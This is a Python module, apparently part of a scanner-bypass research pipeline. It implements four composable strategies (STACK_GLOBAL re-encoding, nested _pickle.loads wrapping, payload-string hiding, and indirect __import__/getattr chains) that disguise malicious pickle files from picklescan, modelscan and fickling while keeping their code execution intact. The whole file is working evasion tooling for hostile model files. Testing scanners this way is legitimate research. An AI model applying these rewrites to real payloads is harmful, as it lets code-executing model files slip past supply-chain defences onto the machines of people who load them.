"""Phase 1 — Evasion strategies for static scanner bypass research.

Each strategy rewrites an already-malicious pickle stream so that the *same
payload still executes identically at load time* while the byte-level
signature static scanners match is removed or hidden. Strategies compose:
``apply_pipeline`` runs a subset per candidate, selected by campaign feedback.

All strategies preserve execution semantics exactly; ``tests/test_evasion.py``
verifies load-equivalence and trigger execution for each one.
"""

from __future__ import annotations

import pickle
import struct

from pipeline.opcodes import OPCODES_BY_NAME, parse_pickle


def _enc_short_binunicode(s: str) -> bytes:
    """Encode a short (<256 chars) string as SHORT_BINUNICODE."""
    data = s.encode("utf-8")
    if len(data) > 255:
        raise ValueError(f"string too long for SHORT_BINUNICODE: {len(data)}")
    return OPCODES_BY_NAME["SHORT_BINUNICODE"].code + bytes([len(data)]) + data


def _binbytes_tuple(payload: bytes) -> bytes:
    """Opcode-built ``(payload,)`` tuple holding *payload* as BINBYTES.

    Deliberately avoids ``pickle.dumps``: protocol-2 encodes ``bytes`` as
    ``_codecs.encode(<unicode-literal>, 'latin1')``, which would leak the
    nested stream as plaintext into the outer layer.
    """
    if len(payload) > 0xFFFFFFFF:
        raise ValueError("nested payload exceeds BINBYTES capacity")
    return (
        OPCODES_BY_NAME["MARK"].code
        + OPCODES_BY_NAME["BINBYTES"].code
        + struct.pack("<I", len(payload))
        + payload
        + OPCODES_BY_NAME["TUPLE"].code
    )


def _args_tuple_bytes(args: tuple) -> bytes:
    """Protocol-2 encoded args tuple without PROTO/STOP wrapper."""
    return pickle.dumps(args, protocol=2)[2:-1]


def _ensure_proto(stream: bytes, min_proto: int = 4) -> bytes:
    """Bump the PROTO header to >= min_proto (length-preserving version swap).

    STACK_GLOBAL / MEMOIZE require protocol >= 4. FRAME lengths are unchanged:
    the PROTO rewrite swaps one version byte in place.
    """
    if len(stream) >= 2 and stream[0] == 0x80 and stream[1] < min_proto:
        return bytes([0x80, min_proto]) + stream[2:]
    return stream


#: Legacy py2-era module aliases emitted by protocol<=2 GLOBALs; STACK_GLOBAL
#: resolves modules literally at load time, so normalize while rewriting.
_MODULE_ALIASES: dict[str, str] = {
    "__builtin__": "builtins",
    "copy_reg": "copyreg",
}


def _canonical_module(module: str) -> str:
    return _MODULE_ALIASES.get(module, module)


class EvasionStrategy:
    """Base class: rewrite pickle bytes to hide a static signature."""

    #: stable id recorded in the campaign DB / reports
    name: str = "base"
    #: scanner ids this strategy primarily targets
    targets: frozenset[str] = frozenset()

    def apply(self, pkl_bytes: bytes) -> bytes:
        raise NotImplementedError


class StackGlobalEncoding(EvasionStrategy):
    """Rewrite every ``GLOBAL``/``INST`` import into the protocol-4 form.

    ``c<module>\\n<name>\\n`` becomes::

        SHORT_BINUNICODE <module>  SHORT_BINUNICODE <name>  STACK_GLOBAL

    Scanners that pattern-match the two-line delimited GLOBAL operand (or
    emulate only the proto<=3 opcode set) no longer see an import pair.
    Execution is identical: STACK_GLOBAL pops name then module and resolves
    the same callable.
    """

    name = "stack_global_encoding"
    targets = frozenset({"picklescan", "modelscan", "fickling"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes
        parts: list[bytes] = []
        changed = False
        for op, arg in parsed:
            if op.name in ("GLOBAL", "INST"):
                fields = arg.decode("latin1").rstrip("\n").split("\n")
                if len(fields) >= 2:
                    module = _canonical_module(fields[0])
                    fname = fields[1]
                    parts.append(_enc_short_binunicode(module))
                    parts.append(_enc_short_binunicode(fname))
                    parts.append(OPCODES_BY_NAME["STACK_GLOBAL"].code)
                    changed = True
                    continue
            parts.append(op.code + arg)
        if not changed:
            return pkl_bytes
        return _ensure_proto(b"".join(parts))


class NestedLoadsWrap(EvasionStrategy):
    """Wrap the whole stream in ``_pickle.loads(BINBYTES(<stream>))``.

    The outer stream references only ``_pickle.loads`` around an opaque bytes
    blob; dangerous imports live inside the nested stream. Scanners that do
    not recurse into nested loads see one benign-looking global. Unpickling
    the outer object triggers exactly one inner ``loads`` whose result
    becomes the outer result -- semantics identical.
    """

    name = "nested_loads_wrap"
    targets = frozenset({"picklescan", "modelscan", "fickling"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parse_pickle(pkl_bytes)  # sanity: must be well-formed
        except Exception:
            return pkl_bytes
        parts = [
            OPCODES_BY_NAME["GLOBAL"].code,
            b"_pickle\nloads\n",
            _binbytes_tuple(pkl_bytes),
            OPCODES_BY_NAME["REDUCE"].code,
            OPCODES_BY_NAME["STOP"].code,
        ]
        return b"".join(parts)


class PayloadObfuscation(EvasionStrategy):
    """Hide string trigger arguments inside a nested pickle literal.

    Rewrites each ``<callable>(('<trigger-text>',))`` call site so the args
    tuple is constructed as ``_pickle.loads(BINBYTES(<inner pickle>))`` --
    the inner pickle evaluates to the *identical* tuple, so the sink receives
    exactly the same argument, but the plaintext trigger text (paths,
    ``python3 -c``, sentinel names) no longer appears as a string opcode in
    the outer stream. Content-matching scanners lose their needle; recursion-
    capable scanners still find it (that differential is the research signal).
    """

    name = "payload_obfuscation"
    targets = frozenset({"picklescan", "modelscan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        # Locate every call site to rewrite, then emit once, skipping the
        # replaced [tuple_start, REDUCE] regions (additive insertion would
        # duplicate the tuple and desynchronize REDUCE pairing).
        replacements: dict[int, bytes] = {}   # red_idx -> chain bytes
        skips: set[int] = set()               # op indices swallowed by a rewrite
        for i, (op, _arg) in enumerate(parsed):
            if op.name != "REDUCE":
                continue
            start = self._tuple_start(parsed, i)
            if start is None:
                continue
            # Only rewrite *literal* tuple regions: a region containing its
            # own GLOBAL/REDUCE (e.g. protocol-2's ``_codecs.encode`` wrapper
            # for bytes literals) has interleaved execution we must not fuse.
            region_ops = {o.name for o, _ in parsed[start:i]}
            if region_ops & {"GLOBAL", "INST", "STACK_GLOBAL", "REDUCE"}:
                continue
            blob = b"".join(o.code + a for o, a in parsed[start:i])
            rewritten = self._hide_tuple_blob(blob)
            if rewritten is None:
                continue
            replacements[i] = rewritten
            skips.update(range(start, i))

        if not replacements:
            return pkl_bytes

        out: list[bytes] = []
        for i, (op, arg) in enumerate(parsed):
            if i in skips:
                continue
            if i in replacements:
                out.append(replacements[i])
                out.append(op.code)
                continue
            out.append(op.code + arg)
        return b"".join(out)

    @staticmethod
    def _tuple_start(parsed, red_idx: int) -> int | None:
        """Index where the args tuple for the REDUCE at *red_idx* begins."""
        for j in range(red_idx - 1, max(-1, red_idx - 12), -1):
            if parsed[j][0].name in ("GLOBAL", "INST", "STACK_GLOBAL"):
                start = j + 1
                return start if start < red_idx else None
        return None

    def _hide_tuple_blob(self, blob: bytes) -> bytes | None:
        """Wrap a 1-tuple string arg in nested loads(BINBYTES(inner))."""
        try:
            # The blob is a bare pushable sequence (no PROTO/STOP); append
            # STOP so it can be evaluated for the 1-tuple shape check.
            obj = pickle.loads(blob + OPCODES_BY_NAME["STOP"].code)
        except Exception:
            return None
        if not (isinstance(obj, tuple) and len(obj) == 1):
            return None  # multi-arg sinks keep their original shape
        if not isinstance(obj[0], (str, bytes)):
            return None
        try:
            inner = pickle.dumps(obj, protocol=2)
        except Exception:
            return None
        return b"".join([
            OPCODES_BY_NAME["GLOBAL"].code,
            b"_pickle\nloads\n",
            _binbytes_tuple(inner),
            OPCODES_BY_NAME["REDUCE"].code,
        ])


class IndirectChain(EvasionStrategy):
    """Resolve the sink via ``builtins.__import__`` + ``builtins.getattr``.

    Replaces every ``GLOBAL <module> <sink>`` with a *balanced* runtime chain::

        GLOBAL builtins.getattr
        MARK  GLOBAL builtins.__import__  ('module',) REDUCE   -> module
              SHORT_BINUNICODE 'sink'                            -> name
        TUPLE                                                   -> (module, name)
        REDUCE                                                  -> bound sink

    followed by the untouched args tuple. No GLOBAL operand names the
    dangerous pair, and the nested import is consumed inside the getattr
    argument region, so the stack stays balanced across multiple rewritten
    call sites in one stream.
    """

    name = "indirect_chain"
    targets = frozenset({"picklescan", "modelscan", "fickling"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes
        parts: list[bytes] = []
        changed = False
        for op, arg in parsed:
            if op.name in ("GLOBAL", "INST"):
                fields = arg.decode("latin1").rstrip("\n").split("\n")
                if len(fields) >= 2:
                    module = _canonical_module(fields[0])
                    fname = fields[1]
                    parts += [
                        OPCODES_BY_NAME["GLOBAL"].code,
                        b"builtins\ngetattr\n",
                        OPCODES_BY_NAME["MARK"].code,
                        OPCODES_BY_NAME["GLOBAL"].code,
                        b"builtins\n__import__\n",
                        _args_tuple_bytes((module,)),
                        OPCODES_BY_NAME["REDUCE"].code,
                        _enc_short_binunicode(fname),
                        OPCODES_BY_NAME["TUPLE"].code,
                        OPCODES_BY_NAME["REDUCE"].code,
                    ]
                    changed = True
                    continue
            parts.append(op.code + arg)
        if not changed:
            return pkl_bytes
        return _ensure_proto(b"".join(parts))


# ---------------------------------------------------------------- registry --

STRATEGIES: dict[str, EvasionStrategy] = {
    s.name: s for s in (
        StackGlobalEncoding(),
        NestedLoadsWrap(),
        PayloadObfuscation(),
        IndirectChain(),
    )
}

#: application order: hide strings first, rebuild imports second, wrap last
PIPELINE_ORDER: tuple[str, ...] = (
    "payload_obfuscation",
    "indirect_chain",
    "stack_global_encoding",
    "nested_loads_wrap",
)


def get_strategy(name: str) -> EvasionStrategy | None:
    return STRATEGIES.get(name)


def apply_pipeline(pkl_bytes: bytes, names: list[str]) -> bytes:
    """Apply named strategies in canonical order; unknown names ignored."""
    chosen = [n for n in PIPELINE_ORDER if n in names]
    cur = pkl_bytes
    for n in chosen:
        cur = STRATEGIES[n].apply(cur)
    return cur


def select_strategies(rng, k: int | None = None,
                      exclude_nested: bool = True) -> list[str]:
    """Random subset of strategy names for exploration campaigns."""
    pool = [n for n in STRATEGIES
            if not (exclude_nested and n == "nested_loads_wrap")]
    rng.shuffle(pool)
    if k is None:
        k = rng.randint(0, len(pool))
    return pool[:k]
